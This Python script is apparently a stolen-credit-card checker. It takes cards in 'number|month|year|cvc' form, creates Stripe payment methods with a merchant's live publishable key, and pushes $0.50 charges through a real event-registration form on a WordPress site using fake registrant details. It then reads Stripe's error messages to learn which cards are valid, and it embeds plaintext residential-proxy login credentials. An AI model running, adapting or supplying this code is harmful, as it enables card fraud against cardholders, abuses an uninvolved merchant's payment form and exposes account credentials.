import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		type = "Visa"
	if n.startswith("5"):
		type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(2, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff52291c812%3B+stripe-js-v3%2Ff52291c812%3B+card-element&key=pk_live_51N0YraS0lomgpLYF1RMv19zo2XNSIiiyijdYutUqS6f35eQLngczQCk7Xoi4JPqwXMFQL0ACY4dkDSmEnrIMF9Fr00RAzdsGxc'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'rapidqs.net',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://rapidqs.net',
	    'referer': 'https://rapidqs.net/the-profit-maximisation-workshop/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1755137504697',
	}
	
	data = {
	    'data': f'item_4__fluent_sf=&__fluent_protection_token_4=1pnCFSEvk7hPZ2QMr6itw3LWOhUlmgd4dPHOt%2BdHzJtrTerdFe0Ivka%2FzxNT3xoqntLiynQqVSJE8Ab4Haf3lom%2FJ%2BP%2FWEnm3vBNinPT5mCC6HDpjP2wa810qcVBlOpi&__fluent_form_embded_post_id=3725&_fluentform_4_fluentformnonce=14e952e277&_wp_http_referer=%2Fthe-profit-maximisation-workshop%2F&i_am_based_in_new_zealand_1753398851562%5B%5D=Yes&i_am_interested_in_attending_the_profit_maximisation_workshop_in_person_1753398907020%5B%5D=Yes&event_choice=Profit%20Maximisation%20AKL%2018-AUG-2025&how_many_tickets_1753399992182=One%20Person&firstname_1753316444666=Gen&lastname_1753316446185=Paypal&email_1753316518481=genpaypal02%40gmail.com&phone_1753316512253=%2B14303000850&hidden=Profit%20Maximisation%20Workshop&how_did_you_hear_about_us_optional_1753316612907=&event_registration_total_display=890&custom-payment-amount=0.50&payment_method=stripe&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '4',
	}
	
	response = session.post('https://rapidqs.net/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
	
	try:
		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
	except:
		result = response.text
		
	return (result)
